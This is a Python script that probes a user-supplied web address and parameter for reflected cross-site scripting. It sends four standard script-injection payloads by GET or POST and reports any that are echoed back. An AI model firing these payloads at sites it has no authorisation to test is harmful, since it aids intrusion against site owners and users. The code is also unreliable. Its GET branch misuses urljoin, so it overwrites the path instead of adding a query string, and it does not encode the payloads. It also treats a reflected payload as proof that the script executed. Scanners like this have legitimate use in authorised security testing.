import requests
from urllib.parse import urljoin

# List of common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg/onload=alert('XSS')>",
    "<a href='javascript:alert(1)'>XSS</a>"
]

def test_xss(url, param=None, method='GET'):
    """
    Function to test for XSS vulnerability in a web application.
    
    Args:
    - url (str): The target URL of the web application.
    - param (str): Optional parameter to inject into (e.g., form field, URL parameter).
    - method (str): HTTP method (GET/POST).
    """
    # Test each payload
    for payload in xss_payloads:
        if method.upper() == 'GET':
            # Test by adding the payload in the URL (query parameters)
            test_url = urljoin(url, f"{param}={payload}")
            response = requests.get(test_url)
        elif method.upper() == 'POST':
            # Test by injecting the payload into a form field via POST request
            data = {param: payload}
            response = requests.post(url, data=data)
        else:
            print(f"Unsupported HTTP method: {method}")
            return

        # Check if the payload appears in the response (indicating XSS execution)
        if payload in response.text:
            print(f"[+] Potential XSS vulnerability found with payload: {payload}")
            print(f"    Response contains payload: {payload}")
            print(f"    Test URL: {response.url}")
        else:
            print(f"[-] No XSS vulnerability found with payload: {payload}")

# Example usage
if __name__ == "__main__":
    # Target web application URL
    target_url = input("Enter the URL of the web application to test: ").strip()

    # Optionally specify the parameter name to inject into (e.g., 'username', 'search')
    param = input("Enter the parameter to inject into (e.g., 'username', 'search'): ").strip()

    # HTTP method to use for the test (GET or POST)
    method = input("Enter HTTP method (GET/POST): ").strip()

    # Run XSS test
    test_xss(target_url, param, method)
